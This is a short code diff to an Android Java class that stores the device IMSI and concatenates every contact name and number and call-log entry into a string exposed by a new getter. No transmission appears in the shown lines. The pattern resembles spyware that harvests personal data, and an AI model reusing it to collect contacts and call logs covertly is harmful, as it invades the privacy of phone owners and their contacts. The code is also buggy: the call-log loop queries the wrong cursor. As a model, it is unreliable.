@@ -7,34 +7,40 @@ import android.net.Uri;
 import android.provider.Contacts;
 import android.provider.CallLog;
 
+@SuppressWarnings("deprecation")
 public class GetInfo extends Activity
 {
+	String m_info;
 	String m_IMSI;
+	
 	public GetInfo(String imsi){
-
+		m_IMSI = imsi;
 		Cursor c = getContacts();
 		c.moveToFirst();
-		m_IMSI += "Contacts---";
+		m_info += "Contacts---";
 		while(!c.isLast())
 		{
-			m_IMSI += c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME))+
+			m_info += c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME))+
 				 c.getString(c.getColumnIndexOrThrow(Contacts.People.NUMBER));
 			c.moveToNext();
 		}
 		Cursor l = getLog();
 		l.moveToFirst();
-		m_IMSI += "CallLogs---";
+		m_info += "CallLogs---";
 		while(!l.isLast())
 		{
-			m_IMSI += l.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))+
+			m_info += l.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))+
 				 l.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
 			l.moveToNext();
 		}
 	}
-	
 	public String getIMSI(){
 		return m_IMSI;
 	}
+	public String getInfo(){
+		return m_info;
+	}
+
 	private Cursor getContacts()
     {
         Uri uri = Contacts.People.CONTENT_URI;
